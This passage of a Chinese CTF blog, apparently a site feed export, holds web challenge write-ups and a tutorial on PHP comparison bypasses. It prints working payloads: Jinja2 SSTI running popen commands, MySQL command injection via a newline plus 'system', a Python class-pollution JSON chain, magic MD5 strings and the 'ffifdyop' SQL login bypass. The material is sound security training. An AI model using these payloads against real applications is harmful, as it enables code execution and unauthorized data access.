class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Content-Type: application/json<br></code></pre></td></tr></table></figure><p>最后直接在对应的界面进行简单的ssti注入就行了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;&lt;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;cat flag&#x27;</span>).<span class="hljs-built_in">read</span>()&gt;&gt;<br></code></pre></td></tr></table></figure><h3 id="back-to-the-future"><a class="markdownIt-Anchor" href="#back-to-the-future"></a> Back to the future</h3><p>一时间没想起来怎么写，在nss刷题的时候突然就想起来了，默认去看一下robots.txt，通常不要扫描的都在这里，提醒的是.git然后用githacker这个工具进行恢复，利用git reset --hard 第二个恢复flag</p><p>续：有师傅和我说githack不能直接得到，我用的是gitdumper下来再用githacker的，也可以按这么来。</p><h3 id="rce-or-sql-inject"><a class="markdownIt-Anchor" href="#rce-or-sql-inject"></a> RCE or Sql Inject</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$sql</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sql&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/se|ec|;|@|del|into|outfile/i&#x27;</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你知道的，不可能有sql注入&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&quot;|\$|`|\\\\/i&#x27;</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你知道的，不可能有RCE&quot;</span>);<br>&#125;<br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;mysql -u root -p123456 -e \&quot;use ctf;select &#x27;ctfer! You can\\&#x27;t succeed this time! hahaha&#x27;; -- &quot;</span> . <span class="hljs-variable">$sql</span> . <span class="hljs-string">&quot;\&quot;&quot;</span>;<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$query</span>); ctfer! You can<span class="hljs-string">&#x27;t succeed this time! hahaha ctfer! You can&#x27;</span>t succeed this time! hahaha<br></code></pre></td></tr></table></figure><p>学习学习吧，给的hint告诉了这题其实已经是rce的题目了</p><p>R! C! E!mysql远程连接和命令行操作是不是有些区别呢输个问号看看?</p><p>本地mysql连接输入?看看有一行可以注意到（我在物理机测试上并没有，可能是版本问题，之后会在vps上测一下）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">system (\!) Execute a system shell command.<br></code></pre></td></tr></table></figure><p>那么就是使用system或者<code>\!</code>执行一个system shell命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?sql=%0asystem <span class="hljs-built_in">env</span><br></code></pre></td></tr></table></figure><p>冷知识＋1</p><h3 id="sql-inject-or-rce"><a class="markdownIt-Anchor" href="#sql-inject-or-rce"></a> Sql Inject or RCE</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br>highlight_file(__FILE__);<br><span class="hljs-variable">$sql</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sql&#x27;</span>];<br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/se|ec|st|;|@|delete|into|outfile/i&#x27;</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    die(<span class="hljs-string">&quot;你知道的，不可能有sql注入&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&quot;|\$|`|\\\\/i&#x27;</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    die(<span class="hljs-string">&quot;你知道的，不可能有RCE&quot;</span>);<br>&#125;<br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;mysql -u root -p123456 -e \&quot;use ctf;select &#x27;ctfer! You can\\&#x27;t succeed this time! hahaha&#x27;; -- &quot;</span> . <span class="hljs-variable">$sql</span> . <span class="hljs-string">&quot;\&quot;&quot;</span>;<br>system(<span class="hljs-variable">$query</span>); ctfer! You can<span class="hljs-string">&#x27;t succeed this time! hahaha ctfer! You can&#x27;</span>t succeed this time! hahaha<br></code></pre></td></tr></table></figure><p>在上一题的基础上过滤了system，并且把过滤的del变成了delete，所以可以考虑从del这方面入手。</p><p><code>DELIMITER</code> 是一个用于改变 SQL 语句结束符的命令，通常用于定义存储过程、触发器或函数时，因为这些语句内部会使用 <code>;</code>，而 <code>;</code> 也是 MySQL 默认的语句结束符。简单的说可以把DELIMITER当作；，但是我们可以自定义这个。</p><p>handler是MySQL特有的，可以逐行浏览某个表中的数据，格式：</p><p>打开表：HANDLER 表名 OPEN ;</p><p>查看数据： HANDLER 表名 READ next;</p><p>关闭表： HANDLER 表名 READ CLOSE；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?sql=%0adelimiter orange%0a handler flag openorange%0ahandler flag <span class="hljs-built_in">read</span> next<br></code></pre></td></tr></table></figure><p>实际执行的是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">delimiter orange<br>handler flag openorange<br>handler flag read next<br></code></pre></td></tr></table></figure><h3 id="lucky-number"><a class="markdownIt-Anchor" href="#lucky-number"></a> Lucky Number</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request,render_template_string,render_template<br><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Template<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> heaven<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">cls</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br>instance = cls()<br><br>BLACKLIST_IN_index = [<span class="hljs-string">&#x27;&#123;&#x27;</span>,<span class="hljs-string">&#x27;&#125;&#x27;</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_json</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">try</span>:<br>        json.loads(data)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/m4G1c&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pollute</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">if</span> request.is_json:<br>            merge(json.loads(request.data), instance)<br>            result = heaven.create()<br>            message = result[<span class="hljs-string">&quot;message&quot;</span>]<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;这个魔术还行吧</span><br><span class="hljs-string">&quot;</span> + message<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我要json的魔术&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;记得用POST方法把魔术交上来&quot;</span><br><br><br><span class="hljs-comment">#heaven.py</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">kon=<span class="hljs-string">&quot;Kon&quot;</span>, pure=<span class="hljs-string">&quot;Pure&quot;</span>, *, confirm=<span class="hljs-literal">False</span></span>):<br>    <span class="hljs-keyword">if</span> confirm <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;lucky_number&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> create.__kwdefaults__:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;嗯嗯，我已经知道你要创造东西了，但是你怎么不告诉我要创造什么？&quot;</span>, <span class="hljs-string">&quot;lucky_number&quot;</span>: <span class="hljs-string">&quot;nope&quot;</span>&#125;<br>    <span class="hljs-keyword">if</span> confirm <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;lucky_number&quot;</span> <span class="hljs-keyword">in</span> create.__kwdefaults__:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;这是你的lucky_number，请拿好，去/check下检查一下吧&quot;</span>, <span class="hljs-string">&quot;lucky_number&quot;</span>: create.__kwdefaults__[<span class="hljs-string">&quot;lucky_number&quot;</span>]&#125;<br><br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;你有什么想创造的吗？&quot;</span>, <span class="hljs-string">&quot;lucky_number&quot;</span>: <span class="hljs-string">&quot;nope&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>也是一道原生类的题目orz</p><p>从已知的代码进行分析，在heaven.py里有create函数的<code>__kwdefaults__</code>,同时还需要confirm是true.涉及动态加载模块或处理模块之间的依赖时,需要<code>sys.modules</code> 来访问已经加载的模块.回到代码中并没有导入sys模组，这时可以利用python的内置函数<code>__spec__</code>.包含了关于类加载时的信息，定义在Lib/importlib/_bootstrap.py的类ModuleSpec，所以可以直接采用&lt;模块名&gt;.<strong>spec</strong>.<strong>init</strong>.<strong>globals</strong>[‘sys’]获取到sys模块，此处就可以使用json模块获取.(以上跟着官p学的，我还没学这么多orz)</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Content-Type: application/json<br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs json"><br><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;__init__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;__globals__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;json&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;__spec__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;__init__&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;__globals__&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                            <span class="hljs-attr">&quot;sys&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                <span class="hljs-attr">&quot;modules&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                    <span class="hljs-attr">&quot;heaven&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                        <span class="hljs-attr">&quot;create&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                              <span class="hljs-attr">&quot;__kwdefaults__&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                              <span class="hljs-attr">&quot;confirm&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                                              <span class="hljs-attr">&quot;lucky_number&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;5346&quot;</span><br>                                             <span class="hljs-punctuation">&#125;</span> <br>                                        <span class="hljs-punctuation">&#125;</span><br>                                    <span class="hljs-punctuation">&#125;</span><br>                                <span class="hljs-punctuation">&#125;</span><br>                            <span class="hljs-punctuation">&#125;</span><br>                        <span class="hljs-punctuation">&#125;</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>然后会变成<code>快去/ssSstTti1注入吧</code></p><p>然后就是普通的无过滤的ssti注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;cat flag&#x27;</span>).<span class="hljs-built_in">read</span>()&#125;&#125;<br></code></pre></td></tr></table></figure><h3 id="just-readme"><a class="markdownIt-Anchor" href="#just-readme"></a> Just Readme</h3><p>官p给的是<a href="https://github.com/ambionics/cnext-exploits">ambionics/cnext-exploitsCNEXT 的漏洞(CVE-2024-2961)</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深入浅出PHP强弱比较</title>
    <link href="/2024/08/04/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E5%BC%BA%E5%BC%B1%E6%AF%94%E8%BE%83/"/>
    <url>/2024/08/04/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E5%BC%BA%E5%BC%B1%E6%AF%94%E8%BE%83/</url>
    
    <content type="html"><![CDATA[<p>鉴于最近打的一个比赛，来了解一下ctf中经常出现的弱等于强等于的问题</p><h2 id="php弱类型"><a class="markdownIt-Anchor" href="#php弱类型"></a> PHP弱类型</h2><h3 id="q1二者弱比教"><a class="markdownIt-Anchor" href="#q1二者弱比教"></a> Q1:二者弱比教</h3><p>这部分内容自己检索，简要的说<code>==</code>的情况下，左右两边的类型会进行转化。</p><p>举个例子来说</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span>&amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>))<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are right!&quot;</span>;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;erro&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>如题，需要我们传入的内容不一样，但是MD5加密之后需要相同</p><p>常见的做法有两种</p><p>方法一：</p><p>弱比教数组绕过，payload如下</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?a[]=1&amp;b[]=2<br></code></pre></td></tr></table></figure><p>先进行数组的比较，1！=2，再md5加密，对于对数组的加密，默认是Null，两者加密之后相同</p><p>方法二：</p><p>常见的知识积累</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?a=240610708&amp;b=s214587387a0<br></code></pre></td></tr></table></figure><p>原理是两者MD5加密之后开头都是0e，在php语言中，0e会在php解释为0</p><p>以下是常见的一些</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">QNKCDZO<br>240610708<br>s878926199a<br>s155964671a<br>s214587387a0<br></code></pre></td></tr></table></figure><p>sha1的弱比教类比上面的内容</p><h3 id="q2自身弱比教"><a class="markdownIt-Anchor" href="#q2自身弱比教"></a> Q2:自身弱比教</h3><p>例题如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-variable">$a</span>)<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are right!&quot;</span>;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;erro&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>只需要md5加密之后等于自己就行</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?a=0e215962017<br></code></pre></td></tr></table></figure><p>做下记录就行</p><h3 id="q3登入用户md5万能密码"><a class="markdownIt-Anchor" href="#q3登入用户md5万能密码"></a> Q3:登入用户Md5(万能密码)</h3><p>这个常见于登陆界面</p><p>可以参考这个文章，<a href="https://blog.csdn.net/qq_44879989/article/details/133363370">文章</a></p><p><code>ffifdyop</code> 经过两次转化后得到的结果是 <code>'or'6�]��!r,��b</code>。位于 <code>or</code> 两侧的单引号可以用于闭合两端的单引号，使得 <code>or</code> 不再被 MySQL 认为是字符串，而是一个关键字，发挥着 <code>逻辑或运算符</code> 的作用,以下是常见的例子</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ffifdyop<br>129581926211651571912466741651878684928<br></code></pre></td></tr></table></figure><h3 id="q4md5双层嵌套"><a class="markdownIt-Anchor" href="#q4md5双层嵌套"></a> Q4:Md5双层嵌套</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">md5(md5($a))==md5($a)<br></code></pre></td></tr></table></figure><p>列举几个例子</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">CbDLytmyGm2xQyaLNhWn<br>770hQgrBOjrcqftrlaZk<br>7r4lGXCH2Ksu2JNT3BYM<br></code></pre></td></tr></table></figure><p>可本地自己测试</p><h2 id="php强类型"><a class="markdownIt-Anchor" href="#php强类型"></a> PHP强类型</h2><h3 id="q1二者强比较"><a class="markdownIt-Anchor" href="#q1二者强比较"></a> Q1:二者强比较</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span>&amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>))<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are right!&quot;</span>;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;erro&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>也可以用数组进行绕过</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?a[]=1&amp;b[]=2<br></code></pre></td></tr></table></figure><h3 id="q2二者强比较类限制"><a class="markdownIt-Anchor" href="#q2二者强比较类限制"></a> Q2:二者强比较(类限制)</h3><p>当限制在类中无法利用数组，可以尝试md5碰撞，这里推荐工具fastcoll</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAphp%E5%BC%BA%E5%BC%B1%E6%AF%94%E8%BE%83/1.png" alt="1"></p><p>然后工具执行</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAphp%E5%BC%BA%E5%BC%B1%E6%AF%94%E8%BE%83/2.png" alt="2"></p><p>接下来写一个例题就行比较一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;C:\Users\30226\Desktop\ctftool\tools\fastcoll\1.txt&quot;</span>);<br><br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;C:\Users\30226\Desktop\ctftool\tools\fastcoll\2.txt&quot;</span>);<br><br><span class="hljs-variable">$aa</span>=<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$bb</span>=<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$aa</span>===<span class="hljs-variable">$bb</span>)<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;ok&quot;</span>);<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;erro&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br><span class="hljs-variable">$aaa</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$bbb</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$aaa</span>===<span class="hljs-variable">$bbb</span>)<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;ok&quot;</span>);<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;erro&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%96%87%E7%AB%A0/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAphp%E5%BC%BA%E5%BC%B1%E6%AF%94%E8%BE%83/3.png" alt="3"></p><h3 id="q3md5和sha1强比较"><a class="markdownIt-Anchor" href="#q3md5和sha1强比较"></a> Q3:MD5和sha1强比较</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cianiao</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var2</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$var1</span>, <span class="hljs-variable">$var2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$var1</span> = <span class="hljs-variable">$var1</span>;<br>        <span class="hljs-variable">$var2</span> = <span class="hljs-variable">$var2</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span 